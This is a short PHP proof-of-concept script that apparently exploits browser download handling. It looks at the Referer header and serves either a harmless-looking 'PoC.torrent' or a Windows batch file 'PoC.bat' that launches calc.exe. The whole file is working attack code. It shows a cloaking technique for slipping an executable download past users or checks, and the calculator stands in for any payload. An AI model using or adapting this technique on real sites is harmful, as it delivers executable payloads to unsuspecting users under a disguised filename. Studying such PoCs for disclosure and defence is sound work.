<?php

if(isset($_SERVER['HTTP_REFERER'])){
    header("Content-Disposition: attachment; filename='PoC.torrent'; filename*=UTF-8''PoC.torrent");
    header("Content-Type: application/octet-stream");
}
else{
    header("Content-Disposition: attachment; filename='PoC.bat'; filename*=UTF-8''PoC.bat");
    header("Content-Type: application/x-bat");
    echo "@echo off\n";
    echo "START 'C:\\Windows\\system32\\calc.exe";
}
?>
